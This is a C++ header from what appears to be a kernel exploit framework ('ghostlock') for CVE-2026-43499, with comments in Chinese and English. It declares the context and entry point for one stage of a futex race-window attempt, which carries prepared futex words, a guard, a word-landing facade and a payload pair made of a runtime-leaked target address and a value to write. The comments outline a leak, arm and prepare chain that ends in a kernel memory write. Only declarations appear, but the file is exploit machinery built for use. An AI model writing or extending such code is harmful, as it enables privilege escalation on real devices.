#pragma once
/** @file backend/cve_2026_43499/steps/window_runner.hpp
 *  把两件成品粘成一个执行体：阶段节奏（window_steps）跑在真尝试（window_attempt）上。
 *
 *  这一层只解决「边界」：两个已经准备好的 futex 字与窗口守卫由调用方给；
 *  字从哪里来（leak → arm → prepare 那套）不在本层，缺它们时本层会具名说缺。
 *
 *  设备专用（尝试要 linux/futex.h）。
 */
#include "backend/cve_2026_43499/landing/multicast_window.hpp"
#include "backend/cve_2026_43499/steps/window_attempt.hpp"
#include "backend/cve_2026_43499/steps/window_steps.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    // TODO(routeexec-compile-time): 机械改动（类型形状）—— 本结构此前非模板，其 `route` 成员是
    //   `landing::RouteExec *`（虚基类指针）；按用户裁定与 docs/analysis/43499-plan-routeexec-compile-time.md
    //   改以具体路由类型参数化（编译期调用）。完成 = 三线门禁绿 ＋ 真机判据不变 ＋ 用户确认 ⇒ 删本标注。
    /** What a stage is given besides its numbers: the two prepared words and the guard.
     *  @tparam Route The route the named fallback points at, known at the call site. */
    template <landing::RouteExec Route>
    struct WindowStageContext final {
        std::uint32_t *chain = nullptr;
        std::uint32_t *target = nullptr;
        race::WindowGuard *window = nullptr;
        /** 引擎（调用方持有）："赢"的判据在它里面，本层只负责把上下文递进去。 */
        Route *route = nullptr;
        /** 旧码（原文保留 ✓）：
         *      （本结构此前**只有** `route` 这一个写入口 ✗）
         *  TODO(access-split): 2026-10-12 裁定「旧实现接入 kernel access」—— 引擎此前直调
         *  `RouteExec::execute` ✗ ⇒ **绕过 warm-up** ✗（`arm_sequence` 的注释逐字要求那些轮必须发生：
         *  「a run without them is not the same run」）⇒ 改由门面 `WordLanding::land_word` 落字 ✓，
         *  `route` 保留为**具名回退**（未接线时必须说出来，不得静默直写 ✗）。
         *  完成 = 门面接线且门禁全绿 ＋ 真机判据 ＋ 用户确认 ⇒ 删本注释块与 `route` 回退。 */
        WordLanding *landing_landing = nullptr;
        /** 载荷那一对：target 是运行时泄漏到的地址，value 来自文档。 */
        std::uint64_t payload_target = 0U;
        std::uint64_t payload_value = 0U;
    };

    /** Run one stage: attempt/settle/repair/rounds from @p request, the attempt from this unit"s
     *  real one. The caller fills @p request"s numbers and may override the settle hook (the
     *  default is the device"s sleep).
     *  @return nullptr when the stage won, or a named reason (step-words-unprepared when the two
     *  words or the guard are missing). */
    /** @tparam Route The route type the stage's context carries.
     *  @return nullptr when the stage won, or a named reason (step-words-unprepared). */
    template <landing::RouteExec Route>
    [[nodiscard]] const char *run_window_stage_with_attempt(WindowStep step, WindowStageRequest &request,
                                                            WindowStageContext<Route> &context) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
